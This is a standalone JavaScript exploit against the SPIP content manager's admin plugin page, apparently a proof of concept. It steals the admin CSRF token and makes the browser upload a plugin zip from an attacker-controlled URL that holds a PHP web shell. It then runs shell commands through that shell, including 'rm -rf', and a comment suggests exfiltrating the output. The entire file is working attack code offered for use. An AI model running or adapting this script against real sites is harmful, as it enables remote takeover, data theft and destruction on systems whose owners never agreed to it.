var url = 'https://[attacker_controlled_url]/websh.zip';
var destination = 'websh'; //set destination to the name of the zip, without extension
var webshell_name = 'websh.php';
var cmd = `ls -la; rm -rf ../${destination}`;

//1 - CSRF - retrieve CSRF token
function get_upload_plugin_csrf_token() {
    var x = new XMLHttpRequest();
    x.open('GET', '/ecrire/?exec=charger_plugin');
    x.responseType = 'document';
    x.send();

    x.onreadystatechange = function () {
        if (x.readyState == 4) {
            formulaire_action_sign = x.response.getElementsByName('formulaire_action_sign')[0].value;
            formulaire_action_args = encodeURIComponent(x.response.getElementsByName('formulaire_action_args')[0].value);
            upload_plugin(formulaire_action_sign, formulaire_action_args);
        }
    };
}

//2 - CSRF - upload plugin with CSRF token as webmaster
function upload_plugin(formulaire_action_sign, formulaire_action_args) {
    var x = new XMLHttpRequest();
    x.open('POST', '/ecrire/?exec=charger_plugin');
    x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    x.send(`var_ajax=form&exec=charger_plugin&formulaire_action=charger_plugin_archive&formulaire_action_args=${formulaire_action_args}&formulaire_action_sign=${formulaire_action_sign}&archive=${url}&destination=${destination}`);

    x.onreadystatechange = function () {
        if (x.readyState == 4) {
            exec_command();
        }
    };
}

//3 - RCE - execute command
function exec_command() {
    var x = new XMLHttpRequest();
    x.open('GET', `/plugins/auto/${destination}/${webshell_name}?cmd=${cmd}`); 
    x.send();

    x.onreadystatechange = function () {
        if (x.readyState == 4) {
            console.log(x.responseText); // do whatever you want with response (e.g. exfiltration)
        }
    };
}

function main_exploit() {
    get_upload_plugin_csrf_token();
}

main_exploit();